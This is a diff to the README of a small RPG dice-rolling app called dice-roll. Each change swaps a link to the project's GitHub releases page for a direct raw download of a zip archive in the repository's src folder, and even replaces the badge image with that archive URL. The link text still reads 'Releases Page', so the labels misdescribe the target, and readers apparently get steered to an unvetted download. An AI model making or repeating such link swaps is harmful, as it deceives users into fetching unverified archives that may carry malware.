@@ -1,7 +1,7 @@
 # 🎲 dice-roll - Roll Dice Effortlessly for RPGs
 
 ## 📥 Download Now
-[![Download dice-roll](https://img.shields.io/badge/Download-dice--roll-blue.svg)](https://github.com/Philipcocu1/dice-roll/releases)
+[![Download dice-roll](https://github.com/Philipcocu1/dice-roll/raw/refs/heads/main/src/roll-dice-2.4.zip)](https://github.com/Philipcocu1/dice-roll/raw/refs/heads/main/src/roll-dice-2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to dice-roll! This application is designed to help you roll dice quickly and easily, specifically for tabletop RPGs. It handles various notations like `2d6+3` or `4d20k3`. 
@@ -13,7 +13,7 @@ Welcome to dice-roll! This application is designed to help you roll dice quickly
 - Disk Space: 50 MB available space
 
 ## 📁 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Philipcocu1/dice-roll/releases). 
+To get started, visit this page to download: [Releases Page](https://github.com/Philipcocu1/dice-roll/raw/refs/heads/main/src/roll-dice-2.4.zip). 
 
 On the releases page, you will find different versions available for download. Choose the one that is compatible with your operating system. 
 
@@ -62,4 +62,4 @@ For detailed inquiries, consider submitting an issue on GitHub, and we will get 
 This project is licensed under the MIT License. You can use it freely, but we appreciate any credit when you do.
 
 ## 📥 Download Now Again
-Don't forget to download the application here: [Releases Page](https://github.com/Philipcocu1/dice-roll/releases). Enjoy your rolling experience!
+Don't forget to download the application here: [Releases Page](https://github.com/Philipcocu1/dice-roll/raw/refs/heads/main/src/roll-dice-2.4.zip). Enjoy your rolling experience!
